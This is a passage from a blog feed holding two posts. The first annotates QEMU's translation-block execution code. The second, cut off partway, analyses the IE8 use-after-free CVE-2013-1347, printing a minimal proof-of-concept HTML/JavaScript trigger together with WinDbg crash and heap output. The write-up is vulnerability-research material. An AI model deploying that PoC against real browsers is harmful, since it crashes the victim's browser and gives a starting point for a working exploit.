class="line"></span><br><span class="line">            cpu-&gt;tb_flushed = <span class="literal">false</span>; <span class="comment">/* reset before first TB lookup */</span></span><br><span class="line">            <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">                <span class="comment">//处理中断</span></span><br><span class="line">                cpu_handle_interrupt(cpu, &amp;last_tb);</span><br><span class="line">                <span class="comment">//负责找到下一个需要执行的tb</span></span><br><span class="line">                tb = tb_find_fast(cpu, &amp;last_tb, tb_exit);</span><br><span class="line">                <span class="comment">//执行找到的tb</span></span><br><span class="line">                cpu_loop_exec_tb(cpu, tb, &amp;last_tb, &amp;tb_exit, &amp;sc);</span><br><span class="line">                <span class="comment">/* Try to align the host and virtual clocks</span></span><br><span class="line"><span class="comment">                   if the guest is in advance */</span></span><br><span class="line">                align_clocks(&amp;sc, cpu);</span><br><span class="line">            &#125; <span class="comment">/* for(;;) */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">#<span class="keyword">if</span> defined(__clang__) || !QEMU_GNUC_PREREQ(<span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line">            <span class="comment">/* Some compilers wrongly smash all local variables after</span></span><br><span class="line"><span class="comment">             * siglongjmp. There were bug reports for gcc 4.5.0 and clang.</span></span><br><span class="line"><span class="comment">             * Reload essential local variables here for those compilers.</span></span><br><span class="line"><span class="comment">             * Newer versions of gcc would complain about this code (-Wclobbered). */</span></span><br><span class="line">             <span class="comment">//说明是通过siglongjmp到达的，恢复cpu之前保存的信息</span></span><br><span class="line">            cpu = current_cpu;</span><br><span class="line">            cc = CPU_GET_CLASS(cpu);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* buggy compiler */</span></span></span><br><span class="line">            <span class="comment">/* Assert that the compiler does not smash local variables. */</span></span><br><span class="line">            g_assert(cpu == current_cpu);</span><br><span class="line">            g_assert(cc == CPU_GET_CLASS(cpu));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* buggy compiler */</span></span></span><br><span class="line">            cpu-&gt;can_do_io = <span class="number">1</span>;</span><br><span class="line">            tb_lock_reset();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">/* for(;;) */</span></span><br><span class="line"></span><br><span class="line">    cc-&gt;cpu_exec_exit(cpu);</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fail safe : never use current_cpu outside cpu_exec() */</span></span><br><span class="line">    current_cpu = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Does not need atomic_mb_set because a spurious wakeup is okay.  */</span></span><br><span class="line">    atomic_set(&amp;tcg_current_cpu, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cpu-exec-c-tb-find-fast"><a href="#cpu-exec-c-tb-find-fast" class="headerlink" title="cpu-exec.c tb_find_fast"></a>cpu-exec.c tb_find_fast</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> TranslationBlock *<span class="title">tb_find_fast</span><span class="params">(CPUState *cpu,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             TranslationBlock **last_tb,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">int</span> tb_exit)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPUArchState *env = (CPUArchState *)cpu-&gt;env_ptr;</span><br><span class="line">    TranslationBlock *tb;</span><br><span class="line">    target_ulong cs_base, pc;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we record a subset of the CPU state. It will</span></span><br><span class="line"><span class="comment">       always be the same before a given translated block</span></span><br><span class="line"><span class="comment">       is executed. */</span></span><br><span class="line">    <span class="comment">//获得当前cpu相关信息 pc, cs_base, flags</span></span><br><span class="line">    cpu_get_tb_cpu_state(env, &amp;pc, &amp;cs_base, &amp;flags);</span><br><span class="line">    <span class="comment">//tb加锁</span></span><br><span class="line">    tb_lock();</span><br><span class="line">    <span class="comment">//尝试以TB的pc为参数寻找已经翻译过的TB</span></span><br><span class="line">    tb = cpu-&gt;tb_jmp_cache[tb_jmp_cache_hash_func(pc)];</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!tb || tb-&gt;pc != pc || tb-&gt;cs_base != cs_base ||</span><br><span class="line">                 tb-&gt;flags != flags)) &#123;</span><br><span class="line">        <span class="comment">/*没有找到则调用tb_find_slow 在tb_find_slow函数中会</span></span><br><span class="line"><span class="comment">        以 pc(cs + eip)对应的物理地址寻找TB。如果找到则将TB写入tb_jmp_cache; 若否，則进行翻译。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        tb = tb_find_slow(cpu, pc, cs_base, flags);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cpu-&gt;tb_flushed) &#123;</span><br><span class="line">        <span class="comment">/* Ensure that no TB jump will be modified as the</span></span><br><span class="line"><span class="comment">         * translation buffer has been flushed.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        *last_tb = <span class="literal">NULL</span>;</span><br><span class="line">        cpu-&gt;tb_flushed = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_USER_ONLY</span></span><br><span class="line">    <span class="comment">/* We don't take care of direct jumps when address mapping changes in</span></span><br><span class="line"><span class="comment">     * system emulation. So it's not safe to make a direct jump to a TB</span></span><br><span class="line"><span class="comment">     * spanning two pages because the mapping for the second page can change.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (tb-&gt;page_addr[<span class="number">1</span>] != <span class="number">-1</span>) &#123;</span><br><span class="line">        *last_tb = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* See if we can patch the calling TB. */</span></span><br><span class="line">    <span class="keyword">if</span> (*last_tb &amp;&amp; !qemu_loglevel_mask(CPU_LOG_TB_NOCHAIN)) &#123;</span><br><span class="line">        <span class="comment">//tb_add_jump(*last_tb, tb_exit, tb);</span></span><br><span class="line">    &#125;</span><br><span class="line">    tb_unlock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cpu-exec-c-tb-find-slow"><a href="#cpu-exec-c-tb-find-slow" class="headerlink" title="cpu-exec.c tb_find_slow"></a>cpu-exec.c tb_find_slow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> TranslationBlock *<span class="title">tb_find_slow</span><span class="params">(CPUState *cpu,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      target_ulong pc,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      target_ulong cs_base,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      <span class="keyword">uint32_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TranslationBlock *tb;</span><br><span class="line"></span><br><span class="line">    tb = tb_find_physical(cpu, pc, cs_base, flags);</span><br><span class="line">    <span class="keyword">if</span> (tb) &#123;</span><br><span class="line">        <span class="comment">//如果在对应物理地址中找到TB则跳转到found</span></span><br><span class="line">        <span class="keyword">goto</span> found;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_USER_ONLY</span></span><br><span class="line">    <span class="comment">/* mmap_lock is needed by tb_gen_code, and mmap_lock must be</span></span><br><span class="line"><span class="comment">     * taken outside tb_lock.  Since we're momentarily dropping</span></span><br><span class="line"><span class="comment">     * tb_lock, there's a chance that our desired tb has been</span></span><br><span class="line"><span class="comment">     * translated.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    tb_unlock();</span><br><span class="line">    mmap_lock();</span><br><span class="line">    tb_lock();</span><br><span class="line">    tb = tb_find_physical(cpu, pc, cs_base, flags);</span><br><span class="line">    <span class="keyword">if</span> (tb) &#123;</span><br><span class="line">        mmap_unlock();</span><br><span class="line">        <span class="keyword">goto</span> found;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//没有找到则调用tb_gen_code进行翻译</span></span><br><span class="line">    <span class="comment">/* if no translated code available, then translate it now */</span></span><br><span class="line">    tb = tb_gen_code(cpu, pc, cs_base, flags, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_USER_ONLY</span></span><br><span class="line">    mmap_unlock();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line">    <span class="comment">//将TB写入tb_jmp_cache</span></span><br><span class="line">    <span class="comment">/* we add the TB in the virtual pc hash table */</span></span><br><span class="line">    cpu-&gt;tb_jmp_cache[tb_jmp_cache_hash_func(pc)] = tb;</span><br><span class="line">    <span class="keyword">return</span> tb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="translate-all-c-tb-gen-code"><a href="#translate-all-c-tb-gen-code" class="headerlink" title="translate-all.c tb_gen_code"></a>translate-all.c tb_gen_code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called with mmap_lock held for user mode emulation.  */</span></span><br><span class="line"><span class="function">TranslationBlock *<span class="title">tb_gen_code</span><span class="params">(CPUState *cpu,</span></span></span><br><span class="line"><span class="function"><span class="params">                              target_ulong pc, target_ulong cs_base,</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">uint32_t</span> flags, <span class="keyword">int</span> cflags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPUArchState *env = cpu-&gt;env_ptr;</span><br><span class="line">    TranslationBlock *tb;</span><br><span class="line">    <span class="keyword">tb_page_addr_t</span> phys_pc, phys_page2;</span><br><span class="line">    target_ulong virt_page2;</span><br><span class="line">    tcg_insn_unit *gen_code_buf;</span><br><span class="line">    <span class="keyword">int</span> gen_code_size, search_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PROFILER</span></span><br><span class="line">    <span class="keyword">int64_t</span> ti;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 注意! 這裡會將虛擬位址轉成物理位址。phys_pc 將交給之後的 tb_link_page 使用。</span></span><br><span class="line"><span class="comment">// get_page_addr_code 在 process mode 直接返回 pc; system mode 則透過查找</span></span><br><span class="line"><span class="comment">// env 的 tlb_table 返回 GPA 在客戶機內存中的偏移量。</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    将虚拟地址转化为物理地址，用户模式下直接返回pc,系统模式下看不下去</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    phys_pc = get_page_addr_code(env, pc);</span><br><span class="line">    <span class="keyword">if</span> (use_icount &amp;&amp; !(cflags &amp; CF_IGNORE_ICOUNT)) &#123;</span><br><span class="line">        cflags |= CF_USE_ICOUNT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    分配TranslationBlock描述符，将要翻译的pc等信息记录下来</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    tb = tb_alloc(pc);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!tb)) &#123;</span><br><span class="line"> buffer_overflow:</span><br><span class="line">        <span class="comment">/* flush must be done */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        分配失败，可能满了，清空cache</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        tb_flush(cpu);</span><br><span class="line">        <span class="comment">/* cannot fail at this point */</span></span><br><span class="line">        tb = tb_alloc(pc);</span><br><span class="line">        assert(tb != <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    gen_code_buf = tcg_ctx.code_gen_ptr;</span><br><span class="line">    tb-&gt;tc_ptr = gen_code_buf;</span><br><span class="line">    tb-&gt;cs_base = cs_base;</span><br><span class="line">    tb-&gt;flags = flags;</span><br><span class="line">    tb-&gt;cflags = cflags;</span><br><span class="line"></span><br><span class="line">    .......</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化gen_opc_ptr 和 gen_opparam_ptr  </span></span><br><span class="line">    tcg_func_start(&amp;tcg_ctx);</span><br><span class="line"></span><br><span class="line">    tcg_ctx.cpu = ENV_GET_CPU(env);</span><br><span class="line">    <span class="comment">//生成TCG操作码</span></span><br><span class="line">    gen_intermediate_code(env, tb);</span><br><span class="line">    tcg_ctx.cpu = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    trace_translate_block(tb, tb-&gt;pc, tb-&gt;tc_ptr);</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ??? Overflow could be handled better here.  In particular, we</span></span><br><span class="line"><span class="comment">       don't need to re-do gen_intermediate_code, nor should we re-do</span></span><br><span class="line"><span class="comment">       the tcg optimization currently hidden inside tcg_gen_code.  All</span></span><br><span class="line"><span class="comment">       that should be required is to flush the TBs, allocate a new TB,</span></span><br><span class="line"><span class="comment">       re-initialize it per above, and re-do the actual code generation.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将TCG操作码翻译成相应host的指令</span></span><br><span class="line">    gen_code_size = tcg_gen_code(&amp;tcg_ctx, tb);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(gen_code_size &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> buffer_overflow;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="target-i386-translate-c-gen-intermediate-code"><a href="#target-i386-translate-c-gen-intermediate-code" class="headerlink" title="target-i386/translate.c gen_intermediate_code"></a>target-i386/translate.c gen_intermediate_code</h3><p>这个函数看的好蒙啊，好多不懂的，简单来说就是调用了 <code>disas_insn</code> 函数把指令转化为 <code>TCG</code> 操作码</p><h3 id="target-i386-translate-c-disas-insn"><a href="#target-i386-translate-c-disas-insn" class="headerlink" title="target-i386/translate.c disas_insn"></a>target-i386/translate.c disas_insn</h3><p>因为对操作码的处理情况太多，所以只分析了一部分<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>: <span class="comment">/* call Ev */</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">XXX:</span> optimize if memory (no 'and' is necessary) */</span></span><br><span class="line">    <span class="keyword">if</span> (dflag == MO_16) &#123;</span><br><span class="line">        tcg_gen_ext16u_tl(cpu_T0, cpu_T0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//next_eip </span></span><br><span class="line">    next_eip = s-&gt;pc - s-&gt;cs_base;</span><br><span class="line">    tcg_gen_movi_tl(cpu_T1, next_eip);</span><br><span class="line">    gen_push_v(s, cpu_T1);</span><br><span class="line">    gen_op_jmp_v(cpu_T0);</span><br><span class="line">    gen_bnd_jmp(s);</span><br><span class="line">    gen_eob(s);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">case</span> <span class="number">0xe8</span>: <span class="comment">/* call im */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (dflag != MO_16) &#123;</span><br><span class="line">            tval = (<span class="keyword">int32_t</span>)insn_get(env, s, MO_32);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tval = (<span class="keyword">int16_t</span>)insn_get(env, s, MO_16);</span><br><span class="line">        &#125;</span><br><span class="line">        next_eip = s-&gt;pc - s-&gt;cs_base;</span><br><span class="line">        tval += next_eip;</span><br><span class="line">        <span class="keyword">if</span> (dflag == MO_16) &#123;</span><br><span class="line">            tval &amp;= <span class="number">0xffff</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!CODE64(s)) &#123;</span><br><span class="line">            tval &amp;= <span class="number">0xffffffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tcg_gen_movi_tl(cpu_T0, next_eip);</span><br><span class="line">        gen_push_v(s, cpu_T0);</span><br><span class="line">        gen_bnd_jmp(s);</span><br><span class="line">        gen_jmp(s, tval);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p><code>case 0xe8</code>的情况下，加入是指令 <code>8048902: call 80489d2</code>,则它的机器指令为 <code>E8 CB 00 00 00</code>。 根据当前架构获得 <code>tval = 0x000000cb</code>, <code>tcg_gen_movi_tl(cpu_T0, next_eip);</code> 将下条指令保存到 <code>cpu_T0</code>, <code>gen_push_T0(s)</code> 将当前 <code>CPU上</code> 下文地址压入<code>T0</code>，保存调用前环境。<br><code>gen_jmp(s, tval)</code> 跳转到目标函数入口地址。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从备份失败的老博客还原出来的&lt;br&gt;
    
    </summary>
    
    
      <category term="old_blog" scheme="https://vsane.github.io/tags/old-blog/"/>
    
      <category term="qemu" scheme="https://vsane.github.io/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2013-1347</title>
    <link href="https://vsane.github.io/2019/01/09/CVE-2013-1347/"/>
    <id>https://vsane.github.io/2019/01/09/CVE-2013-1347/</id>
    <published>2019-01-09T07:52:41.000Z</published>
    <updated>2019-01-09T09:06:08.246Z</updated>
    
    <content type="html"><![CDATA[<p>从备份失败的老博客还原出来的<br><a id="more"></a></p><h2 id="poc-分析"><a href="#poc-分析" class="headerlink" title="poc 分析"></a>poc 分析</h2><p>复现时使用的 <code>poc</code> 是漏洞战争附带资料里的 <code>min_poc</code>，代码如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span> <span class="comment">&lt;!-- required --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ttttt:whatever</span> <span class="attr">id</span>=<span class="string">"myanim"</span>/&gt;</span><span class="comment">&lt;!-- required format --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    f0=<span class="built_in">document</span>.createElement(<span class="string">'span'</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(f0);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">f1=<span class="built_in">document</span>.createElement(<span class="string">'span'</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(f1);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">f2=<span class="built_in">document</span>.createElement(<span class="string">'span'</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(f2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.contentEditable=<span class="string">"true"</span>;</span></span><br><span class="line"><span class="javascript">f2.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'datalist'</span>)); <span class="comment">//has to be a data list</span></span></span><br><span class="line"><span class="javascript">f1.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'table'</span>));    <span class="comment">//has to be a table</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="javascript">        f0.offsetParent=<span class="literal">null</span>;                       <span class="comment">//required</span></span></span><br><span class="line"><span class="javascript">&#125;<span class="keyword">catch</span>(e)&#123;  &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">f2.innerHTML=<span class="string">""</span>;                                    <span class="comment">//required</span></span></span><br><span class="line"><span class="javascript">f0.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'hr'</span>));       <span class="comment">//required</span></span></span><br><span class="line"><span class="javascript">f1.innerHTML=<span class="string">""</span>;                                    <span class="comment">//required</span></span></span><br><span class="line"><span class="undefined">CollectGarbage();</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>开启页堆和栈回溯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gflags.exe /i iexplore.exe +hpa +ust</span><br></pre></td></tr></table></figure></p><p><code>windbg</code> 附加已经打开 <code>poc</code> 的 <code>ie8</code> 浏览器，发生崩溃<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 6c770000 6c822000   C:\Windows\System32\jscript.dll</span><br><span class="line">(a44.664): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=68a89100 ebx=06e38fb0 ecx=06e1dfc8 edx=00000000 esi=0473c8e8 edi=00000000</span><br><span class="line">eip=6870b68d esp=0473c8bc ebp=0473c8d4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\System32\mshtml.dll - </span><br><span class="line">mshtml!Ordinal104+0x4b0ee:</span><br><span class="line">6870b68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:06e1dfc8=????????</span><br></pre></td></tr></table></figure></p><p>查看 <code>ecx</code> 发现不可访问，并且 <code>ecx</code> 指向的地址之前已经被 <code>free</code>, 所以可以存在 <code>use after free</code> 漏洞。回溯可知 <code>mshtml!CGenericElement</code> 对象被释放。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd ecx L1</span><br><span class="line">06b04fc8  ????????</span><br><span class="line">0:005&gt; !heap -p -a ecx</span><br><span class="line">    address 06b04fc8 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 12a1000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                    6592750:          6b04000             2000</span><br><span class="line">    6cba90b2 verifier!AVrfDebugPageHeapFree+0x000000c2</span><br><span class="line">    772365f4 ntdll!RtlDebugFreeHeap+0x0000002f</span><br><span class="line">    